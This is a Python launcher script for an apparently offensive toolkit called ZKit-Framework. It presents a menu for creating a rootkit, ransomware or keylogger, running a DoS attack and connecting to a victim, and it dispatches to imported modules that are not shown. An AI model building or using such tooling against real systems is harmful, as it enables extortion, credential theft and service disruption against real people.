"ZKit-Framework Github : https://github.com/000Zer000/ZKit-Framework"
# Copyright (c) 2020, Zer0 . All rights reserved.
# This Work Is Licensed Under Apache Software License 2.0
# More Can Be Found In The LICENSE File.
__author__ = "Zer0"
__version__ = "1.4.7"
__license__ = "Apache Software License 2.0"
__status__ = "Production"
import os
import sys
sys.path.insert(0, os.path.abspath(os.path.dirname(__file__)))
try:
    # Doing some imports
    from core.helper_core import notify, Color, Generate, dos, \
        ctrler, init, print_banner, list_builtin_payloads, search_for_payloads, crash_handler, list_payloads
    from updater import API as updater
except (ImportError, ModuleNotFoundError) as e:
    # Ops ! Sth is missing

    print(
        "One Or Some On Requirments Not Found . Please Install Them And Try Again ."
        + "Python Threw : "
        + str(e)
    )
    raise


def list_builtin_payloads_helper(type_):
    payloads = list_builtin_payloads(type_)
    index = input("")
    Generate(list(payloads.values())[int(index) - 1])


def list_payloads_helper():
    payloads = list_payloads()
    if len(payloads) == 0:
        print(
            "No User Payload Was Found . Please Download one from zkit-market or make one using" +
            "Zkit-Payload-Template")
    else:
        print(
            "Please Choose One Of Them (Number Of It): ", end="")
        index = input("")
        Generate(list(payloads.values())[int(index) - 1])


PAYLOAD_CHOICES = {'1': 'rootkit', '2': 'ransomware', '3': 'keylogger'}


class Start:
    def __init__(self):
        "Starts zkit with those beautiful menues"
        # Printing A Banner More Coming Soon
        _, red, green, yellow, blue, magenta, cyan, _, reset = Color().GetAllColors()
        init()
        print_banner()
        updater().check_for_updates()
        # Hard And Boring Code
        print(
            "\t " * 5 + "Hacking is" + red + " C " + green + "O " + blue + "L " +
            yellow + "O " + magenta + "R " + green +
            "F " + red + "U " + magenta + "L " + reset
        )
        print(
            "Available Options Are :\n"
            + red + "  {1} --> Create A RootKit\n"
            + green + "  {2} --> Create A Ransomware\n"
            + blue + "  {3} --> Create A KeyLogger \n"
            + yellow + "  {4} --> Run A Dos Attack\n"
            + magenta + "  {5} --> Connect To A Victim\n"
            + red + "  {6} --> Generate Your User Payloads\n"
            + cyan + "  {000}" + "--> Exit ZKit-Framework\n" + reset
        )

    def _execute_payload_related(self, choice):
        choice = choice.replace(
            choice, PAYLOAD_CHOICES[choice])
        list_builtin_payloads_helper(choice)

    def execute(self, choice):
        if choice in PAYLOAD_CHOICES:
            self._execute_payload_related(choice)

        elif choice == "4":
            dos.Main()
        elif choice == "5":
            ctrler.Main()
        elif choice == "6":
            list_payloads_helper()
        elif choice is not None:
            notify(
                "problem", "Invalid Input {" + "{}".format(choice) + "}")

    def main_loop(self):
        while True:

            choice = str(input("..> "))

            if choice == "000":
                break
            self.execute(choice)


starter = Start()
try:
    starter.main_loop()
except (KeyboardInterrupt, EOFError):
    print("\nPlease Type '000' To Exit ZKit-Framework\n")
    starter.main_loop()
except BaseException as e:
    crash_handler(e)
